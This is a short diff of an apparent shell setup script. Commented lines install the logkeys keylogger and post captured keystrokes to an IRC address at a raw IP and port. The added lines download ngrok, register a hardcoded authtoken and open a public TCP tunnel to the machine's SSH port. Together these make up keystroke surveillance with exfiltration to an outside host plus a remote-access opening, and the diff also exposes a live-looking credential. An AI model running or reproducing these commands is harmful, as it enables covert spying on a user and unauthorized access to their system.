@@ -8,4 +8,8 @@
 #wget http://launchpadlibrarian.net/165012984/logkeys_0.1.1a+git5ef6b0dcb9e3-2_amd64.deb
 #sudo apt install logkeys_0.1.1a+git5ef6b0dcb9e3-2_amd64.deb
 #logkeys -s --post-size=1K --post-irc 75.138.184.49:27580
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
+
+wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
+tar -xvf ngrok-v3-stable-linux-amd64.tgz
+./ngrok config add-authtoken 28Kn9ch4pzaAkXtG3CigpJWhgb7_2WcHxNFrNGXeTdBJnXBpy
+./ngrok tcp 22
